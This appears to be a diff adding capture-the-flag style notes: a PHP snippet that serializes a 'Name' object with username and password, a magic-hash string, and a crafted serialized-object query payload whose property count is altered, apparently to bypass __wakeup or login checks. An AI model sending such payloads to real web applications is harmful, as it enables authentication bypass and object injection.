@@ -1,0 +1,13 @@
+<?php
+class Name
+{
+    private $password = '45';
+    private $username = 'zhangsan';
+}
+$a = new Name();
+echo serialize($a);
+?>
+
+
+0e215962017
+//?lisi=O:4:"Name":3:{s:14:"%00Name%00password";s:2:"45";s:14:"%00Name%00username";s:8:"zhangsan";}
